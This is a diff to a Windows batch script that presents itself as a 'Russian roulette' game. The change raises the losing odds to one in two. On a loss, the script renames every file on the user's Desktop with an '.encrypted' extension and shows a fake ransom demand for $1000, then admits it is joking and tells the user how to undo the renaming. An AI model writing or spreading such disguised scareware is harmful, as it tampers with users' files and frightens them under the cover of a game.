@@ -26,23 +26,21 @@ echo.
 echo.                              Press any key to shoot...
 pause >nul
 echo.
-set /a "rand=%random% %% 6"
+set /a "rand=%random% %% 2"
 if %rand%==0 (
-    for %%f in ("C:\Users\%username%\Desktop\deez") do (
-        ren "%%f" "%%~nxf.deez"
+    cd "C:\Users\%username%\Desktop\"
+    for %%i in (*) do (
+        ren "%%i" "%%i.encrypted"
     )
     echo.
-    echo.                           ( ͡° ͜ʖ ͡°
-    echo.                           ( ͡° ͜ʖ ͡°
-    echo.                           ( ͡° ͜ʖ ͡°
-    echo.                           ( ͡° ͜ʖ ͡°
-    echo.                           ( ͡° ͜ʖ ͡°
-    echo.                           ( ͡° ͜ʖ ͡°
+    echo.                     You lost! Your files are encrypted.
+    echo.                        Pay 1000$ to get them back.
     echo.
-    echo.                      You lost! Your files are encrypted.
-    echo.                         Pay 1000$ to get them back.
-    echo.
-    echo.                           Press any key to exit...
+    echo.                          Press any key to exit...
+    pause >nul
+    echo.                           Just kidding. Remove
+    echo.                          the .encrypted extension
+    echo.                        and your files will be back.
     pause >nul
     exit
 ) else (
